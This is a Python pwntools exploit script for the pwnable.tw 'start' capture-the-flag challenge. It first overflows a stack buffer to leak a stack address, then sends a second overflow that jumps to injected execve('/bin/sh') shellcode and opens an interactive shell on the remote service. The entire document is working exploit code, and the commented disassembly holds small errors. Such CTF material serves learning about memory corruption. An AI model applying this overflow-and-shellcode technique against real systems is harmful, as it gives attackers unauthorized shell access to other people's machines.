from pwn import *

debug = False

if debug:
	s = process('./start')
	context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
	gdb.attach(proc.pidof(s)[0], 'b _start')

else:
	s = remote('chall.pwnable.tw', 10000)

addr1 = p32(0x08048087) # mov ecx, esp ; return address

"""
 31 c9  			xor  ecx, ecx ; initialize
 f7 e1				mul  ecx
 51					push ecx
 68 2f 2f 73 68		push 0x68732f2f68
 68 2f 62 69 6e		push 0x6e69622f68
 89 e3				mov  ebx, esp ; execute address
 b0 0b				mov  a1, 0xb  ; system_execve()
 cd 80				int  0x80     ; Linux system call interrupt
"""

shellcode = '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'

def leak():
	recv = s.recvuntil(':')
	print recv
	payload = 'a'*20 + addr1
	s.send(payload)
	print 'send:' + payload
	stackAddr = s.recv(4)
	print 'stack address is : ' + stackAddr
	return u32(stackAddr)

def pwn(addr):
	payload = 'a'*20 + p32(addr+20) + '\x90'*10 + shellcode
	s.send(payload)
	print 'send : ' + payload

addr2 = leak()
pwn(addr2)
s.interactive()
